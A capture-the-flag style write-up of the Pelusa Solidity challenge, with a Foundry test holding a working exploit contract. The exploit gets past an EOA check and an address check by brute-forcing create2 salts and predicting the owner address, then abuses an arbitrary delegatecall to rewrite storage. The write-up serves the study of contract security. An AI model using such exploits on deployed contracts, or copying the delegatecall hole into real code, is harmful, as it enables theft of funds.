## Pelusa handOfGod attack

The Pelusa contract is vulnerable to an **delegatecall** to a address that can be set arbitrarily via `passTheBall()`.

To pass the checks in `passTheBall()` to set our desired "poisoned" contract as the destination for the delegatecall we need to pass two checks.

- `require(msg.sender.code.length == 0, "Only EOA players");` => this can be passed when we call the function in the constructor or our attacker contract
- `require(uint256(uint160(msg.sender)) % 100 == 10, "not allowed");` => this can be passed with a contract address that will pass the check. If we use create2 we can calculate this offchain or we can just bruto-force creations until we pass it as shown in the POC.

When we set the player address in Peluga, we also need to pass the following checks
- `require(isGoal(), "missed");` => here we need to return the right owner when our player contract is called via getBallPossesion(). We can pre calculate the owner and save it in out player contract when we deploy it. We can just calculate the address with calling `address(uint160(uint256(keccak256(abi.encodePacked(msg.sender, blockhash(__BLOCKNUMBER_WHERE_PELUGA_WAS_DEPLOYED__))))))` in our deployment. As long as we deploy our attacker contract inside the next 256 blocks we can just use the function blockhash, if it is older, we need to lookup the blockhash off-chain to calculate the value.
- `require(uint256(bytes32(data)) == 22_06_1986);` => we pass when handOfGod() is returning this uint value.

In our player contract, we then just manipulate the storage variable `goals` in the delegatecall to `handOfGod()`.

## Test

forge test --match-contract=PelusaTest
```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.17;

import "forge-std/Test.sol";

contract PelusaTest is Test {
    Pelusa private pelusa;

    address private pelusaDeployer = makeAddr("PelusaDeployer");
    bytes32 private blockHash;

    function setUp() public {
        // deploy Pelusa via PelusaDeployer
        vm.roll(100); // Pelusa will be deployed on block.number = 101
        vm.startPrank(pelusaDeployer, pelusaDeployer);
        pelusa = new Pelusa();
        blockHash = blockhash(block.number);
        vm.stopPrank();
    }

    function testAttack() public {     
      
      PlayerAttacker playerAttacker;

      // compute the owner address that was calculated in the Pelusa deployment
      address ownerOfPelusa = address(uint160(uint256(keccak256(abi.encodePacked(pelusaDeployer, blockhash(101))))));
      
      uint256 salt;
      for(uint256 i; i < 1;) {
        // we try to deploy a new Attacker contracts via create2 until we have a contract address that will pass the check
        // uint256(uint160(msg.sender)) % 100 == 10
        // this could also be done offchain as we use create2 to deploy the attacker contract
        ++salt;
        try new PlayerAttacker{salt: bytes32(salt)}(pelusa, ownerOfPelusa) returns (PlayerAttacker attacker) {
          playerAttacker = attacker;
          i++;
        } catch {}
      }

      // check that our attacker contract has the ball and returns the right "owner"
      assertTrue(pelusa.isGoal());

      pelusa.shoot(); // shoot and via delegatecall count goals up in peluga

      assertEq(pelusa.goals(), 2); // we passed
    }
}

interface IGame {
    function getBallPossesion() external view returns (address);
}

contract PlayerAttacker is IGame {
    // copy storage from Pelusa    
    address internal player;
    uint256 public goals = 1;

    Pelusa private immutable pelusa;
    address private immutable isGoalReturner;

    constructor(Pelusa _pelusa, address _isGoalReturner) {
      pelusa = _pelusa;
      isGoalReturner = _isGoalReturner;

      pelusa.passTheBall();
    }

    function getBallPossesion() external view returns (address) {
      return isGoalReturner;
    }

    function handOfGod() external returns (uint256) {
        goals++;
        return 22_06_1986;
    }
}

// "el baile de la gambeta"
// https://www.youtube.com/watch?v=qzxn85zX2aE
// @author https://twitter.com/eugenioclrc
contract Pelusa {
    address private immutable owner;
    address internal player;
    uint256 public goals = 1;

    constructor() {
        owner = address(uint160(uint256(keccak256(abi.encodePacked(msg.sender, blockhash(block.number))))));
    }

    function passTheBall() external {
        require(msg.sender.code.length == 0, "Only EOA players");
        require(uint256(uint160(msg.sender)) % 100 == 10, "not allowed");

        player = msg.sender;
    }

    function isGoal() public view returns (bool) {
        // expect ball in owners posession
        return IGame(player).getBallPossesion() == owner;
    }

    function shoot() external {
        require(isGoal(), "missed");
				/// @dev use "the hand of god" trick
        (bool success, bytes memory data) = player.delegatecall(abi.encodeWithSignature("handOfGod()"));
        require(success, "missed");
        require(uint256(bytes32(data)) == 22_06_1986);
    }
}
```
